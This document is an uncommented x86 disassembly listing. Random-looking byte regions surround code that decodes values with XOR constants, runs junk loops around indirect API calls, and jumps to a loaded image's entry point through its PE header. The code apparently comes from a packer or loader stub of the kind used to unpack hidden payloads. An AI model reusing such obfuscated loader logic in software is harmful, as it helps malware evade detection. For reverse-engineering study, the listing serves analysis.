  409b57:	pusha  
  409b58:	lock sbb edx,DWORD PTR [ebx+0x11]
  409b5c:	mov    cs,WORD PTR [ecx-0x44b69181]
  409b62:	sahf   
  409b63:	xor    cl,bl
  409b65:	add    DWORD PTR [esi+ebx*2],eax
  409b68:	cmp    al,0xd5
  409b6a:	outs   dx,BYTE PTR ds:[esi]
  409b6b:	mov    dl,BYTE PTR [edi-0x5ab4416d]
  409b71:	dec    ecx
  409b72:	stos   BYTE PTR es:[edi],al
  409b73:	adc    BYTE PTR [esi],dh
  409b75:	dec    edi
  409b76:	jbe    0x409b0f
  409b78:	jo     0x409bc3
  409b7a:	retf   
  409b7b:	outs   dx,DWORD PTR ds:[esi]
  409b7c:	retf   
  409b7d:	cdq    
  409b7e:	or     ebx,ebx
  409b80:	out    0xf,al
  409b82:	add    esp,DWORD PTR [ecx]
  409b84:	mov    WORD PTR [esi+0x55],ds
  409b87:	sti    
  409b88:	xchg   ecx,eax
  409b89:	inc    ebp
  409b8a:	pop    esi
  409b8b:	fs lock pop es
  409b8e:	adc    al,0x1e
  409b90:	mov    edx,0xb0241df4
  409b95:	mov    DWORD PTR [esi],edx
  409b97:	mov    bl,0xb8
  409b99:	das    
  409b9a:	shl    BYTE PTR [ebp+0x1dbe868c],1
  409ba0:	jp     0x409b56
  409ba2:	and    eax,0x2b73232e
  409ba7:	add    DWORD PTR ds:0x86afcd95,0xc6e3defd
  409bb1:	mov    ah,0x6
  409bb3:	adc    edx,DWORD PTR [edx+0x22345aef]
  409bb9:	lock addr16 push edi
  409bbc:	jo     0x409c3b
  409bbe:	gs stos DWORD PTR es:[edi],eax
  409bc0:	fabs   
  409bc2:	ins    DWORD PTR es:[edi],dx
  409bc3:	cli    
  409bc4:	or     dh,dh
  409bc6:	fst    QWORD PTR [ebx]
  409bc8:	jecxz  0x409be0
  409bca:	shr    DWORD PTR [eax+0x7fb1dde4],0x13
  409bd1:	sub    eax,0xef308b02
  409bd6:	and    DWORD PTR ds:0x796cf8d5,esi
  409bdc:	into   
  409bdd:	mov    al,0xac
  409bdf:	outs   dx,BYTE PTR ds:[esi]
  409be0:	inc    ebp
  409be1:	dec    edi
  409be2:	ins    DWORD PTR es:[edi],dx
  409be3:	ror    edx,cl
  409be5:	or     BYTE PTR [ecx+eiz*1],0x7d
  409be9:	data16 xchg dl,ah
  409bec:	mov    cl,0x86
  409bee:	jmp    0x73e3:0x7ed943ea
  409bf5:	push   eax
  409bf6:	jge    0x409bae
  409bf8:	scas   eax,DWORD PTR es:[edi]
  409bf9:	dec    ebp
  409bfa:	lahf   
  409bfb:	loope  0x409c1b
  409bfd:	mov    ebp,0x3889e2e0
  409c02:	xchg   edi,eax
  409c03:	push   esp
  409c04:	mov    ebx,0xd5488f73
  409c09:	push   edi
  409c0a:	add    BYTE PTR [ecx+edx*8],dl
  409c0d:	es fs push 0xffffffaa
  409c11:	shl    cl,1
  409c13:	bts    DWORD PTR es:[edi+eiz*1+0x56],ebp
  409c19:	scas   al,BYTE PTR es:[edi]
  409c1a:	cmp    ebx,ebx
  409c1c:	jmp    0x409bd0
  409c1e:	imul   ecx,DWORD PTR [esi+0x5b],0x7c207c1d
  409c25:	call   0x6031a1a
  409c2a:	add    BYTE PTR [edi],bh
  409c2c:	mov    ch,0xcd
  409c2e:	xchg   esp,eax
  409c2f:	sub    eax,0x7641f970
  409c34:	ins    BYTE PTR es:[edi],dx
  409c35:	ret    0x9317
  409c38:	dec    ebx
  409c39:	cmp    eax,0xd7262e6
  409c3e:	into   
  409c3f:	std    
  409c40:	loopne 0x409be0
  409c42:	xor    DWORD PTR [ebx],eax
  409c44:	dec    edi
  409c45:	mov    esp,0xae5ec807
  409c4a:	idiv   DWORD PTR [esi+0x28]
  409c4d:	mov    BYTE PTR [ebx+0x3c],ch
  409c50:	or     ebx,edx
  409c52:	test   eax,0x586b59ac
  409c57:	jne    0x409be8
  409c59:	adc    eax,0xf617ee5e
  409c5e:	in     al,0x1e
  409c60:	mov    al,BYTE PTR [ebp+0x72dea01c]
  409c66:	stos   DWORD PTR es:[edi],eax
  409c67:	jno    0x409cdf
  409c69:	daa    
  409c6a:	fidivr DWORD PTR [ecx]
  409c6c:	inc    ebp
  409c6d:	sub    BYTE PTR [eax],cl
  409c6f:	out    dx,al
  409c70:	div    eax
  409c72:	dec    ebx
  409c73:	mov    ebp,0x8893168a
  409c78:	push   edx
  409c79:	jmp    0xeec1:0x692d1d12
  409c80:	and    al,BYTE PTR [eax-0x59513f57]
  409c86:	sbb    edx,esp
  409c88:	xchg   esi,eax
  409c89:	dec    edx
  409c8a:	inc    esi
  409c8b:	jge    0x409d03
  409c8d:	push   ecx
  409c8e:	sbb    al,0xa5
  409c90:	xchg   ebx,eax
  409c91:	adc    dh,ah
  409c93:	mov    ebp,0x7b9696c9
  409c98:	adc    ah,dl
  409c9a:	push   0xae08c280
  409c9f:	fmul   DWORD PTR [eax-0x64]
  409ca2:	sbb    eax,0x2121371c
  409ca7:	or     DWORD PTR [ebp+0x79],ebx
  409caa:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  409cac:	cdq    
  409cad:	xchg   esp,eax
  409cae:	mov    esp,0x95cd1367
  409cb3:	or     ebp,DWORD PTR [esi]
  409cb5:	mov    ebx,0x25476c30
  409cba:	out    0x2e,al
  409cbc:	inc    edi
  409cbd:	adc    ebx,DWORD PTR [edi]
  409cbf:	dec    ecx
  409cc0:	mov    DWORD PTR [esi],0x370b0950
  409cc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cc7:	js     0x409ca5
  409cc9:	mov    eax,ds:0x77560661
  409cce:	(bad)  
  409ccf:	pop    ecx
  409cd0:	enter  0xd033,0xbf
  409cd4:	fs (bad) 
  409cd6:	int    0xff
  409cd8:	sub    edi,edx
  409cda:	add    edi,DWORD PTR [ebp-0x10]
  409cdd:	mov    edx,DWORD PTR [ebp-0x20]
  409ce0:	mov    ebx,DWORD PTR [ebp-0x8]
  409ce3:	xor    edx,eax
  409ce5:	add    edx,ecx
  409ce7:	imul   edx,ebx
  409cea:	cmp    edx,edi
  409cec:	jbe    0x407fba
  409cf2:	pop    ebx
  409cf3:	pop    edi
  409cf4:	leave  
  409cf5:	ret    0x8
  409cf8:	push   ebp
  409cf9:	mov    ebp,esp
  409cfb:	sub    esp,0x70
  409cfe:	xor    DWORD PTR ds:0x43437a,0x600e
  409d08:	push   0x4162b4
  409d0d:	call   DWORD PTR ds:0x432d36
  409d13:	test   ax,ax
  409d16:	jne    0x409d2d
  409d1c:	add    DWORD PTR ds:0x432de2,0x43438a
  409d26:	xor    eax,eax
  409d28:	jmp    0x40a478
  409d2d:	call   DWORD PTR ds:0x432d92
  409d33:	cdq    
  409d34:	mov    DWORD PTR ds:0x432dd2,0x2a3f
  409d3e:	cmp    eax,0x98216565
  409d43:	jne    0x409d55
  409d49:	cmp    edx,0x98798767
  409d4f:	je     0x409d1c
  409d55:	push   0x4162c0
  409d5a:	sub    DWORD PTR ds:0x432dd2,0x490f
  409d64:	call   DWORD PTR ds:0x432ca2
  409d6a:	add    DWORD PTR ds:0x434421,0x7629
  409d74:	test   eax,eax
  409d76:	mov    DWORD PTR ds:0x432dc2,0x36af
  409d80:	jne    0x409d1c
  409d86:	sub    DWORD PTR ds:0x434421,0x434415
  409d90:	push   ebx
  409d91:	xor    DWORD PTR ds:0x432704,ecx
  409d97:	mov    ebx,0xf89c8531
  409d9c:	or     ecx,0x58cd
  409da2:	mov    DWORD PTR [ebp-0x8],ebx
  409da5:	xor    DWORD PTR ds:0x434429,0x5f13
  409daf:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  409db6:	and    DWORD PTR ds:0x43439a,0x0
  409dc0:	jmp    0x409dd2
  409dc5:	mov    ecx,DWORD PTR ds:0x43439a
  409dcb:	inc    ecx
  409dcc:	mov    DWORD PTR ds:0x43439a,ecx
  409dd2:	cmp    DWORD PTR ds:0x43439a,0x10
  409dd9:	jae    0x409e48
  409ddf:	cmp    DWORD PTR ds:0x43439a,0x13
  409de6:	jne    0x409dfc
  409dec:	push   0x432833
  409df1:	push   0x432718
  409df6:	call   DWORD PTR ds:0x432cfe
  409dfc:	jmp    0x409dc5
  409e01:	and    DWORD PTR ds:0x4343a2,0x0
  409e0b:	mov    ecx,DWORD PTR ds:0x4343a2
  409e11:	inc    ecx
  409e12:	mov    DWORD PTR ds:0x4343a2,ecx
  409e18:	cmp    DWORD PTR ds:0x4343a2,0x20
  409e1f:	jne    0x409e3b
  409e25:	push   DWORD PTR [ebp-0x1c]
  409e28:	push   DWORD PTR [ebp-0x10]
  409e2b:	push   0x1942
  409e30:	push   0x6344
  409e35:	call   DWORD PTR ds:0x432d02
  409e3b:	cmp    DWORD PTR ds:0x4343a2,0x1e
  409e42:	jb     0x409e0b
  409e48:	lea    eax,[ebp-0x18]
  409e4b:	sub    DWORD PTR ds:0x43442d,0x379b
  409e55:	mov    DWORD PTR [ebp-0x14],eax
  409e58:	lea    eax,[ebp-0x1c]
  409e5b:	and    DWORD PTR ds:0x432700,0x0
  409e65:	mov    ecx,DWORD PTR ds:0x432700
  409e6b:	inc    ecx
  409e6c:	mov    DWORD PTR ds:0x432700,ecx
  409e72:	cmp    DWORD PTR ds:0x432700,0x20
  409e79:	jne    0x409e98
  409e7f:	push   DWORD PTR [ebp-0xc]
  409e82:	push   DWORD PTR [ebp-0x10]
  409e85:	push   0x37d5
  409e8a:	push   0x73f1
  409e8f:	push   DWORD PTR [ebp-0x1c]
  409e92:	call   DWORD PTR ds:0x4329d6
  409e98:	cmp    DWORD PTR ds:0x432700,0x18
  409e9f:	jb     0x409e65
  409ea5:	and    DWORD PTR ds:0x4326ec,0x0
  409eaf:	mov    ecx,DWORD PTR ds:0x4326ec
  409eb5:	inc    ecx
  409eb6:	mov    DWORD PTR ds:0x4326ec,ecx
  409ebc:	cmp    DWORD PTR ds:0x4326ec,0x19
  409ec3:	jne    0x409ed4
  409ec9:	push   0x477f
  409ece:	call   DWORD PTR ds:0x4329da
  409ed4:	cmp    DWORD PTR ds:0x4326ec,0x13
  409edb:	jb     0x409eaf
  409ee1:	mov    ecx,DWORD PTR ds:0x432dd6
  409ee7:	xor    DWORD PTR ds:0x43439e,ecx
  409eed:	mov    DWORD PTR [ebp-0xc],eax
  409ef0:	and    DWORD PTR ds:0x4326f4,0x0
  409efa:	jmp    0x409f0d
  409eff:	xor    eax,eax
  409f01:	add    eax,DWORD PTR ds:0x4326f4
  409f07:	inc    eax
  409f08:	mov    ds:0x4326f4,eax
  409f0d:	cmp    DWORD PTR ds:0x4326f4,0x1a
  409f14:	jae    0x409f4f
  409f1a:	cmp    DWORD PTR ds:0x4326f4,0x21
  409f21:	jne    0x409f4a
  409f27:	push   0x432de6
  409f2c:	push   DWORD PTR [ebp-0x28]
  409f2f:	push   DWORD PTR [ebp-0x18]
  409f32:	push   0x87ba
  409f37:	push   0x20df
  409f3c:	push   0x519b
  409f41:	push   DWORD PTR [ebp-0x18]
  409f44:	call   DWORD PTR ds:0x432d06
  409f4a:	jmp    0x409eff
  409f4f:	mov    eax,ds:0x4161a0
  409f54:	mov    DWORD PTR ds:0x4326f4,0x19
  409f5e:	cmp    DWORD PTR ds:0x4326f4,0x0
  409f65:	je     0x409fb2
  409f6b:	cmp    DWORD PTR ds:0x4326f4,0x21
  409f72:	jne    0x409fa0
  409f78:	push   0x2812
  409f7d:	push   0x6a58
  409f82:	push   DWORD PTR [ebp-0x24]
  409f85:	push   0x8f98
  409f8a:	push   DWORD PTR [ebp-0x20]
  409f8d:	push   0x26e4
  409f92:	push   DWORD PTR [ebp-0x14]
  409f95:	push   0x4328ab
  409f9a:	call   DWORD PTR ds:0x432d0a
  409fa0:	mov    ecx,DWORD PTR ds:0x4326f4
  409fa6:	dec    ecx
  409fa7:	mov    DWORD PTR ds:0x4326f4,ecx
  409fad:	jmp    0x409f5e
  409fb2:	mov    eax,DWORD PTR [eax+0x1c8]
  409fb8:	xor    DWORD PTR ds:0x4326f4,edx
  409fbe:	mov    eax,DWORD PTR [eax]
  409fc0:	mov    ecx,DWORD PTR [ebp-0xc]
  409fc3:	add    DWORD PTR ds:0x4326f0,0x3eda
  409fcd:	push   esi
  409fce:	mov    esi,0x7510855
  409fd3:	sbb    DWORD PTR ds:0x434415,0x118a
  409fdd:	xor    eax,esi
  409fdf:	sbb    DWORD PTR ds:0x43438e,0x43437a
  409fe9:	push   edi
  409fea:	xor    edi,DWORD PTR ds:0x43438a
  409ff0:	mov    edi,0x32729c
  409ff5:	adc    DWORD PTR ds:0x434415,0x7b86
  409fff:	add    eax,edi
  40a001:	mov    DWORD PTR [ecx],eax
  40a003:	mov    eax,ds:0x4163b4
  40a008:	mov    DWORD PTR ds:0x432dde,0x674a
  40a012:	cmp    eax,0x23c13046
  40a017:	mov    eax,DWORD PTR [ebp-0x4]
  40a01a:	je     0x40a046
  40a020:	mov    ecx,DWORD PTR [ebp-0x8]
  40a023:	xor    eax,esi
  40a025:	sub    DWORD PTR ds:0x4326f4,0x7cc4
  40a02f:	add    eax,edi
  40a031:	add    DWORD PTR ds:0x434386,0x4326f4
  40a03b:	imul   eax,ecx
  40a03e:	mov    DWORD PTR [ebp-0x8],eax
  40a041:	jmp    0x40a156
  40a046:	and    DWORD PTR ds:0x432dde,0x0
  40a050:	mov    ecx,DWORD PTR ds:0x432dde
  40a056:	inc    ecx
  40a057:	mov    DWORD PTR ds:0x432dde,ecx
  40a05d:	cmp    DWORD PTR ds:0x432dde,0x26
  40a064:	jne    0x40a07d
  40a06a:	push   DWORD PTR [ebp-0x18]
  40a06d:	push   0x709e
  40a072:	push   0x1359
  40a077:	call   DWORD PTR ds:0x432d0e
  40a07d:	cmp    DWORD PTR ds:0x432dde,0x19
  40a084:	jb     0x40a050
  40a08a:	xor    eax,esi
  40a08c:	and    DWORD PTR ds:0x434396,0x0
  40a096:	mov    ecx,DWORD PTR ds:0x434396
  40a09c:	inc    ecx
  40a09d:	mov    DWORD PTR ds:0x434396,ecx
  40a0a3:	cmp    DWORD PTR ds:0x434396,0x10
  40a0aa:	jne    0x40a0c0
  40a0b0:	push   0x432805
  40a0b5:	push   0x43281d
  40a0ba:	call   DWORD PTR ds:0x4329de
  40a0c0:	cmp    DWORD PTR ds:0x434396,0xf
  40a0c7:	jne    0x40a0da
  40a0cd:	mov    ecx,DWORD PTR ds:0x434396
  40a0d3:	inc    ecx
  40a0d4:	mov    DWORD PTR ds:0x434396,ecx
  40a0da:	cmp    DWORD PTR ds:0x434396,0x1e
  40a0e1:	jb     0x40a096
  40a0e7:	add    eax,edi
  40a0e9:	mov    ds:0x4162b0,eax
  40a0ee:	mov    ecx,DWORD PTR ds:0x434366
  40a0f4:	sbb    DWORD PTR ds:0x434415,ecx
  40a0fa:	mov    eax,DWORD PTR [ebp-0x8]
  40a0fd:	sbb    ecx,DWORD PTR ds:0x432dd6
  40a103:	xor    eax,esi
  40a105:	not    ecx
  40a107:	add    eax,edi
  40a109:	mov    ds:0x4163b4,eax
  40a10e:	mov    eax,DWORD PTR [ebp-0x4]
  40a111:	mov    ecx,DWORD PTR ds:0x4162b0
  40a117:	sub    DWORD PTR ds:0x4326f0,0x434415
  40a121:	xor    eax,esi
  40a123:	add    eax,edi
  40a125:	mov    DWORD PTR ds:0x434392,0x307
  40a12f:	cmp    ecx,eax
  40a131:	jne    0x40a156
  40a137:	xor    DWORD PTR ds:0x432dce,0x57b5
  40a141:	push   DWORD PTR [ebp-0x4]
  40a144:	sub    DWORD PTR ds:0x434419,0x6bc5
  40a14e:	push   DWORD PTR [ebp-0x8]
  40a151:	call   0x40a47c
  40a156:	mov    eax,ds:0x4161a0
  40a15b:	mov    eax,DWORD PTR [eax+0x18c]
  40a161:	xor    ecx,ecx
  40a163:	mov    eax,DWORD PTR [eax]
  40a165:	sbb    DWORD PTR ds:0x434411,edx
  40a16b:	mov    DWORD PTR [ebp-0x20],eax
  40a16e:	inc    edx
  40a16f:	mov    eax,0xf89c853d
  40a174:	mov    DWORD PTR [ebp-0x24],eax
  40a177:	or     DWORD PTR ds:0x43436a,edx
  40a17d:	mov    DWORD PTR [ebp-0x24],eax
  40a180:	and    DWORD PTR ds:0x43439a,0x0
  40a18a:	jmp    0x40a19c
  40a18f:	mov    edx,DWORD PTR ds:0x43439a
  40a195:	inc    edx
  40a196:	mov    DWORD PTR ds:0x43439a,edx
  40a19c:	cmp    DWORD PTR ds:0x43439a,0x10
  40a1a3:	jae    0x40a1f4
  40a1a9:	cmp    DWORD PTR ds:0x43439a,0x6
  40a1b0:	jne    0x40a1d3
  40a1b6:	push   0x1088
  40a1bb:	push   DWORD PTR [ebp-0x1c]
  40a1be:	push   0x185d
  40a1c3:	push   0x432909
  40a1c8:	push   0x400000
  40a1cd:	call   DWORD PTR ds:0x4329e2
  40a1d3:	cmp    DWORD PTR ds:0x43439a,0x5
  40a1da:	jne    0x40a1ef
  40a1e0:	xor    edx,edx
  40a1e2:	or     edx,DWORD PTR ds:0x43439a
  40a1e8:	inc    edx
  40a1e9:	mov    DWORD PTR ds:0x43439a,edx
  40a1ef:	jmp    0x40a18f
  40a1f4:	mov    DWORD PTR [ebp-0x24],eax
  40a1f7:	mov    DWORD PTR [ebp-0xc],ebx
  40a1fa:	mov    DWORD PTR [ebp-0x24],eax
  40a1fd:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40a204:	mov    ebx,DWORD PTR [ebp-0x8]
  40a207:	and    edx,DWORD PTR ds:0x43439a
  40a20d:	mov    ecx,DWORD PTR [ebp-0x4]
  40a210:	and    DWORD PTR ds:0x432dce,0x0
  40a21a:	mov    edx,DWORD PTR ds:0x432dce
  40a220:	inc    edx
  40a221:	mov    DWORD PTR ds:0x432dce,edx
  40a227:	cmp    DWORD PTR ds:0x432dce,0x22
  40a22e:	jne    0x40a23a
  40a234:	call   DWORD PTR ds:0x4329e6
  40a23a:	cmp    DWORD PTR ds:0x432dce,0x17
  40a241:	jb     0x40a21a
  40a247:	mov    edx,DWORD PTR [ebp-0x4]
  40a24a:	xor    edx,esi
  40a24c:	xor    ecx,esi
  40a24e:	add    ecx,edx
  40a250:	mov    edx,DWORD PTR [ebp-0x4]
  40a253:	xor    ebx,esi
  40a255:	xor    edx,esi
  40a257:	add    ebx,edi
  40a259:	lea    ecx,[ecx+edx*1+0x9757d4]
  40a260:	cmp    ebx,ecx
  40a262:	ja     0x40a2c3
  40a268:	mov    eax,DWORD PTR [ebp-0x4]
  40a26b:	xor    eax,esi
  40a26d:	lea    eax,[eax+ebx*1+0x32729c]
  40a274:	push   eax
  40a275:	mov    eax,DWORD PTR [ebp-0xc]
  40a278:	xor    eax,esi
  40a27a:	lea    eax,[ebp+eax*1+0x3272a4]
  40a281:	push   eax
  40a282:	mov    eax,ds:0x4161a0
  40a287:	push   DWORD PTR [eax+0x1bc]
  40a28d:	call   0x401a05
  40a292:	mov    eax,DWORD PTR [ebp-0x4]
  40a295:	xor    eax,esi
  40a297:	lea    ebx,[ebx+eax*1+0x32729c]
  40a29e:	mov    eax,DWORD PTR [ebp-0x4]
  40a2a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2a4:	xor    ecx,esi
  40a2a6:	xor    eax,esi
  40a2a8:	add    eax,ecx
  40a2aa:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2ad:	xor    ecx,esi
  40a2af:	lea    eax,[eax+ecx*1+0x9757d4]
  40a2b6:	cmp    ebx,eax
  40a2b8:	jbe    0x40a268
  40a2be:	mov    eax,0xf89c853d
  40a2c3:	mov    ecx,DWORD PTR [ebp+0xc]
  40a2c6:	mov    DWORD PTR ds:0x416024,ecx
  40a2cc:	mov    ecx,DWORD PTR [ebp+0x10]
  40a2cf:	mov    DWORD PTR ds:0x416278,ecx
  40a2d5:	mov    ecx,DWORD PTR ds:0x416024
  40a2db:	mov    edx,DWORD PTR [ebp-0x14]
  40a2de:	sub    ecx,edi
  40a2e0:	xor    ecx,esi
  40a2e2:	mov    DWORD PTR [edx],ecx
  40a2e4:	mov    ecx,DWORD PTR [ebp-0x18]
  40a2e7:	cmp    ecx,0xf89c8530
  40a2ed:	je     0x40a34a
  40a2f3:	mov    ecx,DWORD PTR [ebp-0x8]
  40a2f6:	mov    edx,DWORD PTR [ebp-0x1c]
  40a2f9:	xor    ecx,esi
  40a2fb:	add    ecx,edi
  40a2fd:	cmp    ecx,edx
  40a2ff:	je     0x40a34a
  40a305:	mov    eax,ds:0x4161a0
  40a30a:	mov    eax,DWORD PTR [eax+0x194]
  40a310:	mov    ecx,DWORD PTR [eax]
  40a312:	mov    eax,DWORD PTR [ecx+0x3c]
  40a315:	push   DWORD PTR ds:0x416278
  40a31b:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40a31f:	push   DWORD PTR ds:0x416024
  40a325:	add    eax,ecx
  40a327:	mov    ecx,DWORD PTR ds:0x4161a0
  40a32d:	mov    ecx,DWORD PTR [ecx+0x194]
  40a333:	push   DWORD PTR [ecx]
  40a335:	call   eax
  40a337:	mov    ecx,DWORD PTR ds:0x4161a0
  40a33d:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40a343:	mov    DWORD PTR [ecx],eax
  40a345:	jmp    0x40a45a
  40a34a:	mov    ecx,DWORD PTR [ebp-0x8]
  40a34d:	mov    edx,DWORD PTR [ebp-0x20]
  40a350:	xor    ecx,esi
  40a352:	add    ecx,edi
  40a354:	cmp    ecx,edx
  40a356:	jne    0x40a43d
  40a35c:	mov    ecx,DWORD PTR [ebp-0x8]
  40a35f:	xor    ecx,esi
  40a361:	add    ecx,edi
  40a363:	mov    DWORD PTR ds:0x416224,ecx
  40a369:	mov    ecx,DWORD PTR [ebp-0x8]
  40a36c:	xor    ecx,esi
  40a36e:	add    ecx,edi
  40a370:	mov    DWORD PTR ds:0x41621c,ecx
  40a376:	mov    ecx,DWORD PTR [ebp-0x4]
  40a379:	mov    DWORD PTR [ebp-0xc],ecx
  40a37c:	mov    ecx,DWORD PTR [ebp-0x8]
  40a37f:	mov    DWORD PTR [ebp+0xc],ecx
  40a382:	mov    ecx,DWORD PTR [ebp+0xc]
  40a385:	xor    ecx,esi
  40a387:	add    ecx,edi
  40a389:	mov    DWORD PTR [ebp+0xc],ecx
  40a38c:	mov    ecx,DWORD PTR ds:0x416020
  40a392:	mov    ecx,DWORD PTR [ecx]
  40a394:	mov    DWORD PTR [ebp+0xc],ecx
  40a397:	mov    ecx,DWORD PTR ds:0x416228
  40a39d:	mov    ecx,DWORD PTR [ecx]
  40a39f:	mov    DWORD PTR [ebp-0x14],ecx
  40a3a2:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40a3a9:	mov    ecx,DWORD PTR [ebp+0x10]
  40a3ac:	xor    ecx,esi
  40a3ae:	add    ecx,edi
  40a3b0:	mov    DWORD PTR [ebp+0x10],ecx
  40a3b3:	mov    ecx,DWORD PTR ds:0x4161a0
  40a3b9:	mov    DWORD PTR [ebp+0x10],ecx
  40a3bc:	mov    ecx,DWORD PTR [ebp+0xc]
  40a3bf:	mov    DWORD PTR [ebp+0xc],ecx
  40a3c2:	mov    ecx,DWORD PTR [ebp+0xc]
  40a3c5:	push   0x4
  40a3c7:	pop    edx
  40a3c8:	sub    edx,ecx
  40a3ca:	add    edx,DWORD PTR [ebp-0x14]
  40a3cd:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40a3d4:	mov    DWORD PTR [ebp+0x10],edx
  40a3d7:	mov    DWORD PTR [ebp-0x70],eax
  40a3da:	mov    eax,DWORD PTR [ebp+0xc]
  40a3dd:	mov    DWORD PTR [ebp-0x6c],eax
  40a3e0:	mov    eax,DWORD PTR [ebp+0x10]
  40a3e3:	mov    DWORD PTR [ebp-0x68],eax
  40a3e6:	mov    eax,DWORD PTR [ebp-0x24]
  40a3e9:	xor    eax,esi
  40a3eb:	add    eax,edi
  40a3ed:	mov    DWORD PTR [ebp-0x64],eax
  40a3f0:	lea    eax,[ebp-0x2c]
  40a3f3:	mov    DWORD PTR [ebp-0x60],eax
  40a3f6:	mov    eax,DWORD PTR [ebp-0x70]
  40a3f9:	xor    eax,esi
  40a3fb:	add    eax,edi
  40a3fd:	mov    DWORD PTR [ebp-0x70],eax
  40a400:	lea    eax,[ebp-0x70]
  40a403:	push   eax
  40a404:	mov    eax,DWORD PTR [ebp-0xc]
  40a407:	xor    eax,esi
  40a409:	add    eax,edi
  40a40b:	push   eax
  40a40c:	mov    eax,ds:0x4161c0
  40a411:	push   0x416116
  40a416:	push   DWORD PTR [eax]
  40a418:	call   0x40d076
  40a41d:	xor    esi,esi
  40a41f:	mov    eax,DWORD PTR [ebp+0x10]
  40a422:	sub    eax,esi
  40a424:	push   eax
  40a425:	mov    eax,DWORD PTR [ebp+0xc]
  40a428:	add    eax,esi
  40a42a:	push   eax
  40a42b:	call   0x407765
  40a430:	inc    esi
  40a431:	cmp    esi,0x52
  40a434:	jb     0x40a41f
  40a43a:	mov    eax,DWORD PTR [ebp-0xc]
  40a43d:	call   0x405bf4
  40a442:	lea    eax,[ebp+0x4]
  40a445:	mov    DWORD PTR [ebp-0x28],eax
  40a448:	mov    eax,DWORD PTR [ebp-0x10]
  40a44b:	mov    eax,DWORD PTR [ebp-0x4]
  40a44e:	push   DWORD PTR [ebp-0x8]
  40a451:	lea    eax,[ebp-0x28]
  40a454:	push   eax
  40a455:	call   0x40c78b
  40a45a:	mov    eax,ds:0x4161a0
  40a45f:	push   0x4
  40a461:	add    eax,0x1cc
  40a466:	push   eax
  40a467:	lea    eax,[ebp-0x10]
  40a46a:	push   eax
  40a46b:	call   0x401a05
  40a470:	mov    eax,DWORD PTR [ebp-0x10]
  40a473:	mov    eax,DWORD PTR [eax]
  40a475:	pop    edi
  40a476:	pop    esi
  40a477:	pop    ebx
  40a478:	leave  
  40a479:	ret    0xc
  40a47c:	push   ebp
  40a47d:	mov    ebp,esp
  40a47f:	sub    esp,0x24
  40a482:	xor    ecx,ecx
  40a484:	or     ecx,DWORD PTR ds:0x434425
  40a48a:	sub    ecx,DWORD PTR ds:0x43442d
  40a490:	mov    DWORD PTR ds:0x434425,ecx
  40a496:	mov    eax,ds:0x4161a0
  40a49b:	mov    DWORD PTR ds:0x434392,0x17
  40a4a5:	cmp    DWORD PTR ds:0x434392,0x0
  40a4ac:	je     0x40a506
  40a4b2:	cmp    DWORD PTR ds:0x434392,0x5
  40a4b9:	jne    0x40a4d4
  40a4bf:	push   0x378d
  40a4c4:	push   0x43437a
  40a4c9:	push   0x4a36
  40a4ce:	call   DWORD PTR ds:0x432c56
  40a4d4:	cmp    DWORD PTR ds:0x434392,0x6
  40a4db:	jne    0x40a4ee
  40a4e1:	mov    ecx,DWORD PTR ds:0x434392
  40a4e7:	dec    ecx
  40a4e8:	mov    DWORD PTR ds:0x434392,ecx
  40a4ee:	mov    ecx,DWORD PTR ds:0x434392
  40a4f4:	dec    ecx
  40a4f5:	mov    DWORD PTR ds:0x434392,ecx
  40a4fb:	jmp    0x40a4a5
  40a500:	add    DWORD PTR ds:0x432de6,edx
  40a506:	mov    eax,DWORD PTR [eax+0x198]
  40a50c:	mov    ecx,DWORD PTR ds:0x434465
  40a512:	mov    ecx,DWORD PTR [ecx]
  40a514:	sub    DWORD PTR ds:0x434372,ecx
  40a51a:	mov    DWORD PTR [ebp-0x8],eax
  40a51d:	xor    eax,eax
  40a51f:	add    eax,DWORD PTR ds:0x434366
  40a525:	and    eax,DWORD PTR ds:0x4326f4
  40a52b:	mov    ds:0x434366,eax
  40a530:	mov    eax,DWORD PTR [ebp+0x8]
  40a533:	mov    ecx,DWORD PTR [ebp-0x8]
  40a536:	sub    DWORD PTR ds:0x432dde,0x4326f0
  40a540:	push   ebx
  40a541:	adc    DWORD PTR ds:0x434396,ebx
  40a547:	push   esi
  40a548:	mov    esi,0x7510855
  40a54d:	and    DWORD PTR ds:0x432dca,0x0
  40a557:	mov    ebx,DWORD PTR ds:0x432dca
  40a55d:	inc    ebx
  40a55e:	mov    DWORD PTR ds:0x432dca,ebx
  40a564:	cmp    DWORD PTR ds:0x432dca,0x2c
  40a56b:	jne    0x40a57a
  40a571:	push   DWORD PTR [ebp-0xc]
  40a574:	call   DWORD PTR ds:0x432c5a
  40a57a:	cmp    DWORD PTR ds:0x432dca,0x1e
  40a581:	jb     0x40a557
  40a587:	xor    eax,esi
  40a589:	and    DWORD PTR ds:0x4343a2,0x0
  40a593:	jmp    0x40a5a5
  40a598:	mov    ebx,DWORD PTR ds:0x4343a2
  40a59e:	inc    ebx
  40a59f:	mov    DWORD PTR ds:0x4343a2,ebx
  40a5a5:	cmp    DWORD PTR ds:0x4343a2,0x1a
  40a5ac:	jae    0x40a78c
  40a5b2:	cmp    DWORD PTR ds:0x4343a2,0x1d
  40a5b9:	jne    0x40a5cf
  40a5bf:	push   0x74a9
  40a5c4:	push   0x3c30
  40a5c9:	call   DWORD PTR ds:0x432c5e
  40a5cf:	jmp    0x40a598
  40a5d4:	jmp    0x40a78c
  40a5d9:	cmp    dh,BYTE PTR [esi+0x69734bd3]
  40a5df:	inc    edx
  40a5e0:	mov    ch,0x74
  40a5e2:	neg    DWORD PTR [ebx-0x6]
  40a5e5:	bound  eax,QWORD PTR [ebp+ebp*1+0x70e0d223]
  40a5ec:	jo     0x40a583
  40a5ee:	jg     0x40a660
  40a5f0:	jo     0x40a5e0
  40a5f2:	and    al,0x26
  40a5f4:	bound  ecx,QWORD PTR [ebx-0x7ccec0c5]
  40a5fa:	fdiv   QWORD PTR [edx+0x580159a1]
  40a600:	enter  0x9d9c,0xa3
  40a604:	out    0xd7,eax
  40a606:	loopne 0x40a652
  40a608:	stos   BYTE PTR es:[edi],al
